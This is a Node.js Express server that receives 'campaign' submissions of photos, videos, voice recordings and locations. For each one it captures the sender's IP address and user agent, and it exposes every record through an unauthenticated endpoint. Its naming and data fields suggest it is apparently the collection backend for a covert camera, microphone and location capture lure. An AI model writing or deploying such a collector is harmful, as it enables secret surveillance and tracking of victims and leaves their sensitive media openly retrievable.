const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));
app.use(express.static(__dirname));

let submissions = [];

// ============ IP CAPTURE ============
function getClientIP(req) {
    let ip = req.headers['x-forwarded-for'] || 
             req.headers['x-real-ip'] || 
             req.connection.remoteAddress || 
             req.socket.remoteAddress ||
             'Unknown';
    
    if(ip && ip.includes(',')) ip = ip.split(',')[0].trim();
    if(ip && ip.startsWith('::ffff:')) ip = ip.replace('::ffff:', '');
    if(ip === '::1') ip = '127.0.0.1 (localhost)';
    
    return ip;
}

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/api/health', (req, res) => {
    res.json({ status: 'OK', submissions: submissions.length });
});

// Student data POST
app.post('/api/submit', (req, res) => {
    try {
        const clientIP = getClientIP(req);
        
        const data = {
            id: Date.now(),
            campaignName: req.body.campaignName || 'Unknown',
            photos: req.body.photos || [],
            videos: req.body.videos || [],
            voices: req.body.voices || [],
            locations: req.body.locations || [],
            ipAddress: clientIP,
            userAgent: req.headers['user-agent'] || 'Unknown',
            receivedAt: new Date().toLocaleString()
        };
        
        submissions.push(data);
        
        console.log('=================================');
        console.log('📥 NEW SUBMISSION!');
        console.log('📚 Campaign:', data.campaignName);
        console.log('📸 Photos:', data.photos.length);
        console.log('🎥 Videos:', data.videos.length);
        console.log('🎤 Voices:', data.voices.length);
        console.log('📍 Locations:', data.locations.length);
        console.log('🌐 IP:', data.ipAddress);
        console.log('📊 Total:', submissions.length);
        console.log('=================================');
        
        res.status(201).json({ success: true, id: data.id });
    } catch (error) {
        console.error('❌ Error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.get('/api/submissions', (req, res) => {
    res.json(submissions);
});

app.delete('/api/submissions/:id', (req, res) => {
    const idx = submissions.findIndex(s => s.id == req.params.id);
    if (idx > -1) {
        submissions.splice(idx, 1);
        res.json({ success: true });
    } else {
        res.status(404).json({ error: 'Not found' });
    }
});

app.listen(PORT, () => {
    console.log('=================================');
    console.log('🚀 Server Running!');
    console.log('🌐 http://localhost:' + PORT);
    console.log('=================================');
});